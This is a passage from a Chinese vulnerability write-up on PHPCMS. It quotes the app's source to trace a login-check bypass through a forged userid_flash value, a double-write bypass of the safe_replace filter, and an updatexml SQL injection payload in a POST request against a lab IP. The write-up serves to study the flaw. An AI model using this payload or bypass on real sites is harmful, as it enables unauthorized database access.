</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">((</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">-</span> <span class="nx">time</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">26</span><span class="p">)</span> <span class="o">.</span> <span class="nv">$keyb</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">26</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$keyc</span> <span class="o">.</span> <span class="nx">rtrim</span><span class="p">(</span><span class="nx">strtr</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$result</span><span class="p">),</span> <span class="s1">&#39;+/&#39;</span><span class="p">,</span> <span class="s1">&#39;-_&#39;</span><span class="p">),</span> <span class="s1">&#39;=&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121842751.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121842751.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121842751.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121842751.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121842751.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121842751.png" /></p>
<p>全局查找<code>sys_auth</code>的引用,在<code>phpcms\phpcms\libs\classes\param.class.php</code>中看到调用了<code>setcookie</code>并将加密后的值代入cookie中</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">set_cookie</span><span class="p">(</span><span class="nv">$var</span><span class="p">,</span> <span class="nv">$value</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$time</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$time</span> <span class="o">=</span> <span class="nv">$time</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="nv">$time</span> <span class="o">:</span> <span class="p">(</span><span class="nv">$value</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span> <span class="o">?</span> <span class="nx">SYS_TIME</span> <span class="o">-</span> <span class="mi">3600</span> <span class="o">:</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SERVER_PORT&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;443&#39;</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$var</span> <span class="o">=</span> <span class="nx">pc_base</span><span class="o">::</span><span class="na">load_config</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;cookie_pre&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="nv">$var</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_COOKIE</span><span class="p">[</span><span class="nv">$var</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$value</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">setcookie</span><span class="p">(</span><span class="nv">$var</span> <span class="o">.</span> <span class="s1">&#39;[&#39;</span> <span class="o">.</span> <span class="nv">$k</span> <span class="o">.</span> <span class="s1">&#39;]&#39;</span><span class="p">,</span> <span class="nx">sys_auth</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span> <span class="s1">&#39;ENCODE&#39;</span><span class="p">),</span> <span class="nv">$time</span><span class="p">,</span> <span class="nx">pc_base</span><span class="o">::</span><span class="na">load_config</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;cookie_path&#39;</span><span class="p">),</span> <span class="nx">pc_base</span><span class="o">::</span><span class="na">load_config</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;cookie_domain&#39;</span><span class="p">),</span> <span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">setcookie</span><span class="p">(</span><span class="nv">$var</span><span class="p">,</span> <span class="nx">sys_auth</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span> <span class="s1">&#39;ENCODE&#39;</span><span class="p">),</span> <span class="nv">$time</span><span class="p">,</span> <span class="nx">pc_base</span><span class="o">::</span><span class="na">load_config</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;cookie_path&#39;</span><span class="p">),</span> <span class="nx">pc_base</span><span class="o">::</span><span class="na">load_config</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;cookie_domain&#39;</span><span class="p">),</span> <span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121846526.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121846526.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121846526.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121846526.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121846526.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121846526.png" /></p>
<p>全局查找<code>param::set_cookie</code>的引用,在<code>phpcms/modules/attachment/attachments.php</code>中的<code>swfupload_json</code>调用了<code>param::set_cookie</code>且<code>$json_str</code>为可控参数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">pc_base</span><span class="o">::</span><span class="na">load_app_func</span><span class="p">(</span><span class="s1">&#39;global&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">upload_url</span> <span class="o">=</span> <span class="nx">pc_base</span><span class="o">::</span><span class="na">load_config</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;upload_url&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">upload_path</span> <span class="o">=</span> <span class="nx">pc_base</span><span class="o">::</span><span class="na">load_config</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;upload_path&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">imgext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;jpg&#39;</span><span class="p">,</span> <span class="s1">&#39;gif&#39;</span><span class="p">,</span> <span class="s1">&#39;png&#39;</span><span class="p">,</span> <span class="s1">&#39;bmp&#39;</span><span class="p">,</span> <span class="s1">&#39;jpeg&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">userid</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;userid&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;userid&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="p">(</span><span class="nx">param</span><span class="o">::</span><span class="na">get_cookie</span><span class="p">(</span><span class="s1">&#39;_userid&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="nx">param</span><span class="o">::</span><span class="na">get_cookie</span><span class="p">(</span><span class="s1">&#39;_userid&#39;</span><span class="p">)</span> <span class="o">:</span> <span class="nx">sys_auth</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;userid_flash&#39;</span><span class="p">],</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isadmin</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">admin_username</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;roleid&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">groupid</span> <span class="o">=</span> <span class="nx">param</span><span class="o">::</span><span class="na">get_cookie</span><span class="p">(</span><span class="s1">&#39;_groupid&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="nx">param</span><span class="o">::</span><span class="na">get_cookie</span><span class="p">(</span><span class="s1">&#39;_groupid&#39;</span><span class="p">)</span> <span class="o">:</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//判断是否登录
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">userid</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">showmessage</span><span class="p">(</span><span class="nx">L</span><span class="p">(</span><span class="s1">&#39;please_login&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;member&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">upload_json</span><span class="p">(</span><span class="nv">$aid</span><span class="p">,</span> <span class="nv">$src</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$arr</span><span class="p">[</span><span class="s1">&#39;aid&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$aid</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$arr</span><span class="p">[</span><span class="s1">&#39;src&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$src</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$arr</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$json_str</span> <span class="o">=</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$att_arr_exist</span> <span class="o">=</span> <span class="nx">param</span><span class="o">::</span><span class="na">get_cookie</span><span class="p">(</span><span class="s1">&#39;att_json&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$att_arr_exist_tmp</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;||&#39;</span><span class="p">,</span> <span class="nv">$att_arr_exist</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$att_arr_exist_tmp</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">in_array</span><span class="p">(</span><span class="nv">$json_str</span><span class="p">,</span> <span class="nv">$att_arr_exist_tmp</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$json_str</span> <span class="o">=</span> <span class="nv">$att_arr_exist</span> <span class="o">?</span> <span class="nv">$att_arr_exist</span> <span class="o">.</span> <span class="s1">&#39;||&#39;</span> <span class="o">.</span> <span class="nv">$json_str</span> <span class="o">:</span> <span class="nv">$json_str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">param</span><span class="o">::</span><span class="na">set_cookie</span><span class="p">(</span><span class="s1">&#39;att_json&#39;</span><span class="p">,</span> <span class="nv">$json_str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd">     * 设置swfupload上传的json格式cookie
</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">swfupload_json</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$arr</span><span class="p">[</span><span class="s1">&#39;aid&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;aid&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$arr</span><span class="p">[</span><span class="s1">&#39;src&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">safe_replace</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;src&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$arr</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">safe_replace</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$json_str</span> <span class="o">=</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$att_arr_exist</span> <span class="o">=</span> <span class="nx">param</span><span class="o">::</span><span class="na">get_cookie</span><span class="p">(</span><span class="s1">&#39;att_json&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$att_arr_exist_tmp</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;||&#39;</span><span class="p">,</span> <span class="nv">$att_arr_exist</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$att_arr_exist_tmp</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">in_array</span><span class="p">(</span><span class="nv">$json_str</span><span class="p">,</span> <span class="nv">$att_arr_exist_tmp</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$json_str</span> <span class="o">=</span> <span class="nv">$att_arr_exist</span> <span class="o">?</span> <span class="nv">$att_arr_exist</span> <span class="o">.</span> <span class="s1">&#39;||&#39;</span> <span class="o">.</span> <span class="nv">$json_str</span> <span class="o">:</span> <span class="nv">$json_str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">param</span><span class="o">::</span><span class="na">set_cookie</span><span class="p">(</span><span class="s1">&#39;att_json&#39;</span><span class="p">,</span> <span class="nv">$json_str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>但是在<code>__construct</code>函数中要求当前处于已登录状态,但是其判断方式仅对<code>$this-&gt;userid</code>判断是否为空,而<code>$this-&gt;userid</code>来源于<code>$_SESSION['userid'] ? $_SESSION['userid'] : (param::get_cookie('_userid') ? param::get_cookie('_userid') : sys_auth($_POST['userid_flash'], 'DECODE'))</code></p>
<p>当<code>$_SESSION['userid']</code>为空时,即可调用<code>param::get_cookie('_userid') ? param::get_cookie('_userid') : sys_auth($_POST['userid_flash'], 'DECODE')</code></p>
<p>当<code>_userid</code>的cookie为空时,即可将<code>$this-&gt;userid</code>设置为<code>sys_auth($_POST['userid_flash'], 'DECODE')</code>的结果,保证<code>$_POST['userid_flash']</code>是一个可以正常解密的字符串即可绕过登录检查,从而调用<code>swfupload_json</code></p>
<p>在<code>phpcms/modules/mood/index.php</code>中的<code>post</code>函数中,构造参数即可调用<code>param::set_cookie('mood_id', $cookies.','.$mood_id);</code>从而获得一个可以正常解密的字符串</p>
<p><code>http://192.168.241.130:8080/index.php?m=mood&amp;c=index&amp;a=post&amp;id=123&amp;k=1</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121949535.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121949535.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121949535.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121949535.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121949535.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121949535.png" /></p>
<p><code>Set-Cookie: gYvca_mood_id=e5a3qbTrR_cuRH_bUNu77w77DaTEdUSfzpOJXmUqs-7F</code></p>
<p>注意到存在<code>safe_replace</code>,可以使用双写绕过<code>%\27</code>-&gt;<code>%27</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">safe_replace</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;%20&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;%27&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;%2527&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;&amp;quot;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;&lt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&amp;lt;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&amp;gt;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{&#34;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;\\&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=...%26id=gululingbo%\27+and+updatexml(1,concat(0x7e,(user()),0x7e),1)%23%26m=1%26modelid=1%26catid=123%26f=123%26... HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 192.168.241.130:8080
</span></span><span class="line"><span class="cl">Content-Length: 57
</span></span><span class="line"><span class="cl">Pragma: no-cache
</span></span><span class="line"><span class="cl">Cache-Control: no-cache
</span></span><span class="line"><span class="cl">Origin: http://192.168.241.130:8080
</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
</span></span><span class="line"><span class="cl">DNT: 1
</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</span></span><span class="line"><span class="cl">Referer: http://192.168.241.130:8080/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9
